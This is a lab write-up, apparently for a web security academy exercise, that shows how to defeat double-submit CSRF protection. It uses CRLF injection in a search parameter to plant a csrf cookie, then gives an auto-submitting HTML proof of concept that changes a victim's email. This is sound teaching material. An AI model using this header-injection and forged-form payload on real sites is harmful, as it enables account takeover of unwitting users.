# CSRF where token is duplicated in cookie

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

Credentials - wiener:peter, carlos:montoya

### Analysis/Exploitation -

**Find weak CSRF protection**

Login as user `wiener`:

It is immediately obvious that the csrf token appears twice: in the request body as well as in a cookie. This could mean two things:

1. The backend does not do any csrf tracking and just verifies that the body token equals the cookie token which was set at some time earlier
(in this case, during the initial visit of the `/login` page)
1. The backend tracks the csrf tokens as usual, just uses the cookie value as additional line of defense.This is so call the “double submit” defense against CSRF.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/55396d3f-1cc6-43e1-ba2a-ab28a3cc836f/2024-02-20_19-40.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466X5CUHIWE%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215458Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDdwM9KnCy40nP%2FiGDtUD%2F7XmtMIB6LQdkQGyMLYZOOrgIhANru7k8L6wxh%2BUvlvSdJEybhiATscEgH%2FMRbDD%2BUpP3oKogECK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igxr8GWaIZ1LJ4d5Fk0q3AO2%2F7skrhkqfWXayGz4uq9CWSIz8IIdRv4KJ5yf0gkfe72xtRgBMmOfg4YMVOY8qAU3MROlCQdj%2BW7cCUfh%2F%2BV4xLO0ADrPD%2FA%2BH80SQYfgRgC4NX%2Bymmy2099qXt%2BDFd5Sn6j0H9TaULMhzMCwY1sRh8q2yIkkgYIJpK1g%2BzpD6KqKbYl8mc66n305YhCFhOU2g%2BScA0Zim2gmi2MtVKH8Rvto%2BYYi0RDng0GAKsiK0I7xL6rBNkoIv05YWnbK2q6yxTSJSegUl1cjKT02UtpAUnVSB7X97QjhjsWj3l9yOQbTLCnP%2BQZPavXuV2B%2FW0%2FJF7fDCp3Iv6YubWg9sbXm%2BRtnahSWiTxdmw6%2FsvpyfqA9tir5TAJzitin4p76f03CqBlsspanjhG1Q1pEBbfS7xXp0cbSKOzXfJM03qsWny2Y5MHI7hNhLUJ0PRvz08RtgjpQIfDmQdNVSULBTvDhV4nlWEgNqJC72G6oiJ33zh1IHKQcTXsxN8pe9Pk0MlAlTRIQrSP8mSBWHO4a57JsHodHiSnqy1HxD4K6KWnCs7a%2Fjm0FT%2F4ir%2FFpBuRwJRxv0HKlWnm%2BcO9IGLMRH5NcZTJZyEM4Ina68vVktb1%2FTBdyZYVaNbcEmCnNHDClhKPUBjqkAbdjt60A2oz6l4N2q4vk%2FbKjWmoZ963gal0AxMahs%2BNHDCmeSOgIW0yhfgQ9v62zwseWVGV%2BHAZRA6bMT5gpULGImaF0mGzdVo5JKKqQg3J1LRAznmLZO%2BbraPt3e5YAcCYxLzDQS6NCB3r5CydJO%2Fa088W4j%2BnntfERvXv8AEop2Y%2F5f4leOXgaw%2FpTdR5Po5yPkN24hJWr1VVY3oxm4%2Fy%2F3r%2Bn&X-Amz-Signature=516c38ccd8a6997ef67f08e4f664d8549575d9b7337833b5cc286ec1cb31787b&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

the request goes through and the email get updated.

If this don’t work we could try valid CSRF token and cookie from another user since backend tracks the csrf tokens and it could be find out  whether csrf token are tied to session cookie.

**Find ways to set the csrf token**

the blog suffers the same vulnerability in the search feature

**When we click the **`Search`** button, it’ll send a GET request to **`/`** with the parameter **`search`**.**

**Also, when we sent the request, it’ll set a new cookie value: **`LastSearchTerm=<seach_parameter_value>`**!**

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/8533d25a-7752-4f8b-87bd-a0854ec3b792/2024-02-20_20-30.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466X5CUHIWE%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215458Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDdwM9KnCy40nP%2FiGDtUD%2F7XmtMIB6LQdkQGyMLYZOOrgIhANru7k8L6wxh%2BUvlvSdJEybhiATscEgH%2FMRbDD%2BUpP3oKogECK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igxr8GWaIZ1LJ4d5Fk0q3AO2%2F7skrhkqfWXayGz4uq9CWSIz8IIdRv4KJ5yf0gkfe72xtRgBMmOfg4YMVOY8qAU3MROlCQdj%2BW7cCUfh%2F%2BV4xLO0ADrPD%2FA%2BH80SQYfgRgC4NX%2Bymmy2099qXt%2BDFd5Sn6j0H9TaULMhzMCwY1sRh8q2yIkkgYIJpK1g%2BzpD6KqKbYl8mc66n305YhCFhOU2g%2BScA0Zim2gmi2MtVKH8Rvto%2BYYi0RDng0GAKsiK0I7xL6rBNkoIv05YWnbK2q6yxTSJSegUl1cjKT02UtpAUnVSB7X97QjhjsWj3l9yOQbTLCnP%2BQZPavXuV2B%2FW0%2FJF7fDCp3Iv6YubWg9sbXm%2BRtnahSWiTxdmw6%2FsvpyfqA9tir5TAJzitin4p76f03CqBlsspanjhG1Q1pEBbfS7xXp0cbSKOzXfJM03qsWny2Y5MHI7hNhLUJ0PRvz08RtgjpQIfDmQdNVSULBTvDhV4nlWEgNqJC72G6oiJ33zh1IHKQcTXsxN8pe9Pk0MlAlTRIQrSP8mSBWHO4a57JsHodHiSnqy1HxD4K6KWnCs7a%2Fjm0FT%2F4ir%2FFpBuRwJRxv0HKlWnm%2BcO9IGLMRH5NcZTJZyEM4Ina68vVktb1%2FTBdyZYVaNbcEmCnNHDClhKPUBjqkAbdjt60A2oz6l4N2q4vk%2FbKjWmoZ963gal0AxMahs%2BNHDCmeSOgIW0yhfgQ9v62zwseWVGV%2BHAZRA6bMT5gpULGImaF0mGzdVo5JKKqQg3J1LRAznmLZO%2BbraPt3e5YAcCYxLzDQS6NCB3r5CydJO%2Fa088W4j%2BnntfERvXv8AEop2Y%2F5f4leOXgaw%2FpTdR5Po5yPkN24hJWr1VVY3oxm4%2Fy%2F3r%2Bn&X-Amz-Signature=2c938bf086d612e13b0896ccf2ab36eb4cfd00f48c57161a00d10f24e75fed0c&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**we have found that it’s vulnerable to CRLF injection, which enables attacker to add a new cookie!**

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/cfa8c277-988d-49b1-9a5b-6c2c64a2f4f5/2024-02-20_20-38.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466X5CUHIWE%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215458Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDdwM9KnCy40nP%2FiGDtUD%2F7XmtMIB6LQdkQGyMLYZOOrgIhANru7k8L6wxh%2BUvlvSdJEybhiATscEgH%2FMRbDD%2BUpP3oKogECK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igxr8GWaIZ1LJ4d5Fk0q3AO2%2F7skrhkqfWXayGz4uq9CWSIz8IIdRv4KJ5yf0gkfe72xtRgBMmOfg4YMVOY8qAU3MROlCQdj%2BW7cCUfh%2F%2BV4xLO0ADrPD%2FA%2BH80SQYfgRgC4NX%2Bymmy2099qXt%2BDFd5Sn6j0H9TaULMhzMCwY1sRh8q2yIkkgYIJpK1g%2BzpD6KqKbYl8mc66n305YhCFhOU2g%2BScA0Zim2gmi2MtVKH8Rvto%2BYYi0RDng0GAKsiK0I7xL6rBNkoIv05YWnbK2q6yxTSJSegUl1cjKT02UtpAUnVSB7X97QjhjsWj3l9yOQbTLCnP%2BQZPavXuV2B%2FW0%2FJF7fDCp3Iv6YubWg9sbXm%2BRtnahSWiTxdmw6%2FsvpyfqA9tir5TAJzitin4p76f03CqBlsspanjhG1Q1pEBbfS7xXp0cbSKOzXfJM03qsWny2Y5MHI7hNhLUJ0PRvz08RtgjpQIfDmQdNVSULBTvDhV4nlWEgNqJC72G6oiJ33zh1IHKQcTXsxN8pe9Pk0MlAlTRIQrSP8mSBWHO4a57JsHodHiSnqy1HxD4K6KWnCs7a%2Fjm0FT%2F4ir%2FFpBuRwJRxv0HKlWnm%2BcO9IGLMRH5NcZTJZyEM4Ina68vVktb1%2FTBdyZYVaNbcEmCnNHDClhKPUBjqkAbdjt60A2oz6l4N2q4vk%2FbKjWmoZ963gal0AxMahs%2BNHDCmeSOgIW0yhfgQ9v62zwseWVGV%2BHAZRA6bMT5gpULGImaF0mGzdVo5JKKqQg3J1LRAznmLZO%2BbraPt3e5YAcCYxLzDQS6NCB3r5CydJO%2Fa088W4j%2BnntfERvXv8AEop2Y%2F5f4leOXgaw%2FpTdR5Po5yPkN24hJWr1VVY3oxm4%2Fy%2F3r%2Bn&X-Amz-Signature=853b01ee73309b224e075328c64fe00ba0b0601783bab69907ffd044f86111f5&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

generate csrf poc

Remove the auto-submit `<script>` block, and instead add the following code to inject the cookie:

```text
<img src="https://0af700c203d292bf81886c5900e500eb.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=abcd%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/8ad58dd2-a838-4736-93a1-2d575b15da75/2024-02-20_22-00.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466X5CUHIWE%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215458Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDdwM9KnCy40nP%2FiGDtUD%2F7XmtMIB6LQdkQGyMLYZOOrgIhANru7k8L6wxh%2BUvlvSdJEybhiATscEgH%2FMRbDD%2BUpP3oKogECK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igxr8GWaIZ1LJ4d5Fk0q3AO2%2F7skrhkqfWXayGz4uq9CWSIz8IIdRv4KJ5yf0gkfe72xtRgBMmOfg4YMVOY8qAU3MROlCQdj%2BW7cCUfh%2F%2BV4xLO0ADrPD%2FA%2BH80SQYfgRgC4NX%2Bymmy2099qXt%2BDFd5Sn6j0H9TaULMhzMCwY1sRh8q2yIkkgYIJpK1g%2BzpD6KqKbYl8mc66n305YhCFhOU2g%2BScA0Zim2gmi2MtVKH8Rvto%2BYYi0RDng0GAKsiK0I7xL6rBNkoIv05YWnbK2q6yxTSJSegUl1cjKT02UtpAUnVSB7X97QjhjsWj3l9yOQbTLCnP%2BQZPavXuV2B%2FW0%2FJF7fDCp3Iv6YubWg9sbXm%2BRtnahSWiTxdmw6%2FsvpyfqA9tir5TAJzitin4p76f03CqBlsspanjhG1Q1pEBbfS7xXp0cbSKOzXfJM03qsWny2Y5MHI7hNhLUJ0PRvz08RtgjpQIfDmQdNVSULBTvDhV4nlWEgNqJC72G6oiJ33zh1IHKQcTXsxN8pe9Pk0MlAlTRIQrSP8mSBWHO4a57JsHodHiSnqy1HxD4K6KWnCs7a%2Fjm0FT%2F4ir%2FFpBuRwJRxv0HKlWnm%2BcO9IGLMRH5NcZTJZyEM4Ina68vVktb1%2FTBdyZYVaNbcEmCnNHDClhKPUBjqkAbdjt60A2oz6l4N2q4vk%2FbKjWmoZ963gal0AxMahs%2BNHDCmeSOgIW0yhfgQ9v62zwseWVGV%2BHAZRA6bMT5gpULGImaF0mGzdVo5JKKqQg3J1LRAznmLZO%2BbraPt3e5YAcCYxLzDQS6NCB3r5CydJO%2Fa088W4j%2BnntfERvXv8AEop2Y%2F5f4leOXgaw%2FpTdR5Po5yPkN24hJWr1VVY3oxm4%2Fy%2F3r%2Bn&X-Amz-Signature=e67ea0f332e403ad4634f436d3685b1973fe5f2a6f1d204fcd427471b7291a5a&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0af700c203d292bf81886c5900e500eb.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;domain&#46;com" />
      <input type="hidden" name="csrf" value="abcd" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0af700c203d292bf81886c5900e500eb.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=abcd%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
